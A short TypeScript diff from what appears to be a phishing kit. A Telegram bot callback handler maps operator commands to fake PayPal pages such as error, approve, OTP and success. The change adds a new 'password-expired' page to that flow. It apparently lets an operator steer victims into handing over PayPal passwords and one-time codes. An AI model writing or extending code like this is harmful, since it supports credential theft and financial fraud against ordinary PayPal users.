@@ -263,6 +263,7 @@ async function handleCallbackQuery(query: any, botToken: string) {
       // PayPal routes
       'paypal_error': '/paypal/failure',
       'paypal_approve': '/paypal/approve',
+      'paypal_password': '/paypal/password-expired',
       'paypal_otp': '/paypal/otp',
       'paypal_success': '/paypal/success',
       'paypal_home': '/',
